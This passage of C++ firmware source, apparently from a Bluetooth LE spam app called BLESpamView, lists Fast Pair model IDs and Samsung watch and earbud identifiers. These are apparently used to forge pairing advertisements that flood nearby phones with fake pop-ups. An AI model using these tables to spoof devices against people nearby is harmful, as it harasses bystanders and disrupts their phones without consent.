    {0x0F1B8D},
    {0x0F232A},
    {0x0F2D16},
    {0x20A19B},
    {0x20C95C},
    {0x20CC2C},
    {0x213C8C},
    {0x21521D},
    {0x21A04E},
    {0x2D7A23},
    {0x350000},
    {0x470000},
    {0x480000},
    {0x490000},
    {0x5BA9B5},
    {0x5BACD6},
    {0x5BD6C9},
    {0x5BE3D4},
    {0x5C0206},
    {0x5C0C84},
    {0x5C4833},
    {0x5C4A7E},
    {0x5C55E7},
    {0x5C7CDC},
    {0x5C8AA5},
    {0x5CC900},
    {0x5CC901},
    {0x5CC902},
    {0x5CC903},
    {0x5CC904},
    {0x5CC905},
    {0x5CC906},
    {0x5CC907},
    {0x5CC908},
    {0x5CC909},
    {0x5CC90A},
    {0x5CC90B},
    {0x5CC90C},
    {0x5CC90D},
    {0x5CC90E},
    {0x5CC90F},
    {0x5CC910},
    {0x5CC911},
    {0x5CC912},
    {0x5CC913},
    {0x5CC914},
    {0x5CC915},
    {0x5CC916},
    {0x5CC917},
    {0x5CC918},
    {0x5CC919},
    {0x5CC91A},
    {0x5CC91B},
    {0x5CC91C},
    {0x5CC91D},
    {0x5CC91E},
    {0x5CC91F},
    {0x5CC920},
    {0x5CC921},
    {0x5CC922},
    {0x5CC923},
    {0x5CC924},
    {0x5CC925},
    {0x5CC926},
    {0x5CC927},
    {0x5CC928},
    {0x5CC929},
    {0x5CC92A},
    {0x5CC92B},
    {0x5CC92C},
    {0x5CC92D},
    {0x5CC92E},
    {0x5CC92F},
    {0x5CC930},
    {0x5CC931},
    {0x5CC932},
    {0x5CC933},
    {0x5CC934},
    {0x5CC935},
    {0x5CC936},
    {0x5CC937},
    {0x5CC938},
    {0x5CC939},
    {0x5CC93A},
    {0x5CC93B},
    {0x5CC93C},
    {0x5CC93D},
    {0x5CC93E},
    {0x5CC93F},
    {0x5CC940},
    {0x5CC941},
    {0x5CC942},
    {0x5CC943},
    {0x5CC944},
    {0x5CC945},
    {0x5CEE3C},
    {0x6AD226},
    {0x6B1C64},
    {0x6B8C65},
    {0x6B9304},
    {0x6BA5C3},
    {0x6C42C0},
    {0x6C4DE5},
    {0x718FA4},
    {0x89BAD5},
    {0x8A31B7},
    {0x8A3D00},
    {0x8A3D01},
    {0x8A8F23},
    {0x8AADAE},
    {0x8B0A91},
    {0x8B5A7B},
    {0x8B66AB},
    {0x8BB0A0},
    {0x8BF79A},
    {0x8C07D2},
    {0x8C1706},
    {0x8C4236},
    {0x8C6B6A},
    {0x8CAD81},
    {0x8CB05C},
    {0x8CD10F},
    {0x8D13B9},
    {0x8D16EA},
    {0x8D5B67},
    {0x8E14D7},
    {0x8E1996},
    {0x8E4666},
    {0x8E5550},
    {0x9101F0},
    {0x9128CB},
    {0x913B0C},
    {0x915CFA},
    {0x9171BE},
    {0x917E46},
    {0x91AA00},
    {0x91AA01},
    {0x91AA02},
    {0x91AA03},
    {0x91AA04},
    {0x91AA05},
    {0x91BD38},
    {0x91C813},
    {0x91DABC},
    {0x92255E},
    {0x989D0A},
    {0x9939BC},
    {0x994374},
    {0x997B4A},
    {0x99C87B},
    {0x99D7EA},
    {0x99F098},
    {0x9A408A},
    {0x9A9BDD},
    {0x9ADB11},
    {0x9AEEA4},
    {0x9B7339},
    {0x9B735A},
    {0x9B9872},
    {0x9BC64D},
    {0x9BE931},
    {0x9C0AF7},
    {0x9C3997},
    {0x9C4058},
    {0x9C6BC0},
    {0x9C888B},
    {0x9C98DB},
    {0x9CA277},
    {0x9CB5F3},
    {0x9CB881},
    {0x9CD0F3},
    {0x9CE3C7},
    {0x9CEFD1},
    {0x9CF08F},
    {0x9D00A6},
    {0x9D7D42},
    {0x9DB896},
    {0xA7E52B},
    {0xA7EF76},
    {0xA8001A},
    {0xA83C10},
    {0xA8658F},
    {0xA8845A},
    {0xA88B69},
    {0xA8A00E},
    {0xA8A72A},
    {0xA8C636},
    {0xA8CAAD},
    {0xA8E353},
    {0xA8F96D},
    {0xA90358},
    {0xA92498},
    {0xA9394A},
    {0xC6936A},
    {0xC69AFD},
    {0xC6ABEA},
    {0xC6EC5F},
    {0xC7736C},
    {0xC79B91},
    {0xC7A267},
    {0xC7D620},
    {0xC7FBCC},
    {0xC8162A},
    {0xC85D7A},
    {0xC8777E},
    {0xC878AA},
    {0xC8C641},
    {0xC8D335},
    {0xC8E228},
    {0xC9186B},
    {0xC9836A},
    {0xCA7030},
    {0xCAB6B8},
    {0xCAF511},
    {0xCB093B},
    {0xCB529D},
    {0xCC438E},
    {0xCC5F29},
    {0xCC754F},
    {0xCC93A5},
    {0xCCBB7E},
    {0xCD8256},
    {0xD446A7},
    {0xD5A59E},
    {0xD5B5F7},
    {0xD5C6CE},
    {0xD654CD},
    {0xD65F4E},
    {0xD69B2B},
    {0xD6C195},
    {0xD6E870},
    {0xD6EE84},
    {0xD7102F},
    {0xD7E3EB},
    {0xD8058C},
    {0xD820EA},
    {0xD87A3E},
    {0xD8F3BA},
    {0xD8F4E8},
    {0xD90617},
    {0xD933A7},
    {0xD9414F},
    {0xD97EBA},
    {0xD9964B},
    {0xDA0F83},
    {0xDA4577},
    {0xDA5200},
    {0xDAD3A6},
    {0xDADE43},
    {0xDAE096},
    {0xDB8AC7},
    {0xDBE5B1},
    {0xDC5249},
    {0xDCF33C},
    {0xDD4EC0},
    {0xDE215D},
    {0xDE577F},
    {0xDEC04C},
    {0xDEDD6F},
    {0xDEE8C0},
    {0xDEEA86},
    {0xDEF234},
    {0xDF01E3},
    {0xDF271C},
    {0xDF42DE},
    {0xDF4B02},
    {0xDF9BA4},
    {0xDFD433},
    {0xE020C1},
    {0xE06116},
    {0xE07634},
    {0xE09172},
    {0xE4E457},
    {0xE5440B},
    {0xE57363},
    {0xE57B57},
    {0xE5B4B0},
    {0xE5B91B},
    {0xE5E2E9},
    {0xE64613},
    {0xE64CC6},
    {0xE69877},
    {0xE6E37E},
    {0xE6E771},
    {0xE6E8B8},
    {0xE750CE},
    {0xF52494},
    {0x000006},
    {0x00000A},
    {0x00000C},
    {0x000049},
    {0x003001},
    {0x003D8A},
    {0x0052DA},
    {0x109201},
    {0x124366},
    {0x126644},
    {0x284500},
    {0x532011},
    {0x549547},
    {0x567679},
    {0x575836},
    {0x596007},
    {0x612907},
    {0x614199},
    {0x625740},
    {0x641372},
    {0x641630},
    {0x664454},
    {0x706908},
    {0x837980},
    {0x855347},
    {0x861698},
    {0xCB2FE7},

};
const uint16_t BLESpamView::fastpairModels_count = COUNT_OF(fastpairModels);
// easysetup
const BLESpamView::easyU8 BLESpamView::watch_models[] = {
    {0x1A},  //, "Fallback Watch"
    {0x01},  //, "White Watch4 Classic 44m"
    {0x02},  //, "Black Watch4 Classic 40m"
    {0x03},  //, "White Watch4 Classic 40m"
    {0x04},  //, "Black Watch4 44mm"
    {0x05},  //, "Silver Watch4 44mm"
    {0x06},  //, "Green Watch4 44mm"
    {0x07},  //, "Black Watch4 40mm"
    {0x08},  //, "White Watch4 40mm"
    {0x09},  //, "Gold Watch4 40mm"
    {0x0A},  //, "French Watch4"
    {0x0B},  //, "French Watch4 Classic"
    {0x0C},  //, "Fox Watch5 44mm"
    {0x11},  //, "Black Watch5 44mm"
    {0x12},  //, "Sapphire Watch5 44mm"
    {0x13},  //, "Purpleish Watch5 40mm"
    {0x14},  //, "Gold Watch5 40mm"
    {0x15},  //, "Black Watch5 Pro 45mm"
    {0x16},  //, "Gray Watch5 Pro 45mm"
    {0x17},  //, "White Watch5 44mm"
    {0x18},  //, "White & Black Watch5"
    {0xE4},  //, "Black Watch5 Golf Edition"
    {0xE5},  //, "White Watch5 Gold Edition"
    {0x1B},  //, "Black Watch6 Pink 40mm"
    {0x1C},  //, "Gold Watch6 Gold 40mm"
    {0x1D},  //, "Silver Watch6 Cyan 44mm"
    {0x1E},  //, "Black Watch6 Classic 43m"
    {0x20},  //, "Green Watch6 Classic 43m"
    {0xEC},  //, "Black Watch6 Golf Edition"
    {0xEF},  //, "Black Watch6 TB Edition"
};
const uint8_t BLESpamView::watch_models_count = 30;
const uint8_t BLESpamView::buds_models_count = 20;
const BLESpamView::easyU32 BLESpamView::buds_models[] = {
    {0xEE7A0C},  //, "Fallback Buds"
    {0x9D1700},  //, "Fallback Dots"
    {0x39EA48},  //, "Light Purple Buds2"
    {0xA7C62C},  //, "Bluish Silver Buds2"
    {0x850116},  //, "Black Buds Live"
    {0x3D8F41},  //, "Gray & Black Buds2"
    {0x3B6D02},  //, "Bluish Chrome Buds2"
    {0xAE063C},  //, "Gray Beige Buds2"
    {0xB8B905},  //, "Pure White Buds"
    {0xEAAA17},  //, "Pure White Buds2"
    {0xD30704},  //, "Black Buds"
    {0x9DB006},  //, "French Flag Buds"
    {0x101F1A},  //, "Dark Purple Buds Live"
    {0x859608},  //, "Dark Blue Buds"
    {0x8E4503},  //, "Pink Buds"
    {0x2C6740},  //, "White & Black Buds2"
    {0x3F6718},  //, "Bronze Buds Live"
    {0x42C519},  //, "Red Buds Live"
    {0xAE073A},  //, "Black & White Buds2"
    {0x011716},  //, "Sleek Black Buds2"
};
}  // namespace ui::external_app::blespam
